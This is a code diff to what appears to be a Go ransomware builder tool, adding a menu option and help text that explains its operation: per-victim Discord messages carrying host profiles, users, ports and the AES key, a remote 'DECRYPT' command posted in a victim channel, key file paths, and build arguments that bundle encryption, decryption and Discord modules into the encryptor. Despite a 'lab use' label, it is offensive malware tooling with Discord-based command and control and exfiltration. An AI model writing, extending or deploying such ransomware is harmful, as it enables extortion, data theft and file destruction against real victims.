@@ -35,6 +35,8 @@ func LaunchRansomware() {
 		case "2":
 			buildDecryptor()
 		case "3":
+			showRecoveryHelp()
+		case "4":
 			return
 		default:
 			fmt.Printf("%sInvalid option!%s\n", utils.Red, utils.Reset)
@@ -50,7 +52,40 @@ func showRansomwareMenu() {
 
 	fmt.Printf("%s  [1] Build Encryptor%s\n", utils.Green, utils.Reset)
 	fmt.Printf("%s  [2] Build Decryptor%s\n", utils.Blue, utils.Reset)
-	utils.PrintReturnOption("3")
+	fmt.Printf("%s  [3] How recovery works (Discord + local key)%s\n", utils.Yellow, utils.Reset)
+	utils.PrintReturnOption("4")
+}
+
+func showRecoveryHelp() {
+	utils.ClearTerminal()
+	fmt.Printf("\n%s═══ RECOVERY (AUTHORIZED / LAB USE) ═══%s\n\n", utils.Blue, utils.Reset)
+	const body = `
+Discord (two embeds per victim)
+  1) First message: host profile, users, ports, spoiler-wrapped AES hex (64 chars).
+  2) After the disk pass: file count, plaintext bytes, duration, extension breakdown.
+
+The "encryption" and "decryption" key are the same value (symmetric AES-256-GCM).
+
+Remote unlock — in the victim channel, post:
+  DECRYPT <paste_the_full_hex>
+
+  Matching is case-insensitive on the word DECRYPT; the hex must match exactly.
+
+Local unlock — run the decryptor you built with [2]:
+  decrypt.exe <full_hex>
+  (or on Linux: ./decrypt <full_hex>)
+
+  If you omit the argument, it reads the key file written by the encryptor:
+    Windows: %APPDATA%\decryption_key.txt
+    Linux:   /tmp/.decryption_key
+
+Build note: the encryptor binary must include decrypt logic so the bot can
+trigger DecryptSystem() from Discord; the standalone decryptor is only for
+manual/air-gapped recovery.
+`
+	fmt.Print(body)
+	fmt.Println()
+	utils.PauseForInput()
 }
 
 func buildEncryptor() {
@@ -126,7 +161,7 @@ func main() {
 	}
 	defer os.Remove(tempMainFile)
 
-	buildArgs = append(buildArgs, "encrypt.go", "discord.go", tempMainFile)
+	buildArgs = append(buildArgs, "config.go", "encrypt.go", "decrypt.go", "discord.go", tempMainFile)
 
 	cmd := exec.Command("go", buildArgs...)
 	output, err := cmd.CombinedOutput()
@@ -191,7 +226,7 @@ func main() {
 	}
 	defer os.Remove(tempMainFile)
 
-	buildArgs := []string{"build", "-o", filename, "decrypt.go", tempMainFile}
+	buildArgs := []string{"build", "-o", filename, "config.go", "decrypt.go", tempMainFile}
 
 	cmd := exec.Command("go", buildArgs...)
 	output, err := cmd.CombinedOutput()
